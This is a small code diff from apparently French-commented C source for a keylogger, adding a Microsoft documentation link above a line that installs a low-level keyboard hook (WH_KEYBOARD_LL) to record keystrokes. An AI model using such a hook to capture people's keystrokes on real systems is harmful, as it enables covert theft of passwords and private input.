@@ -66,6 +66,8 @@ int start_keylogger() {
 
     /* initialisation du hook permety d'eregistrer l'evennement système WH_KEYBOARD_LL (les frappes au clavier)
        et la fonction de callback est KeyboardProc
+
+       https://learn.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa
     */
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
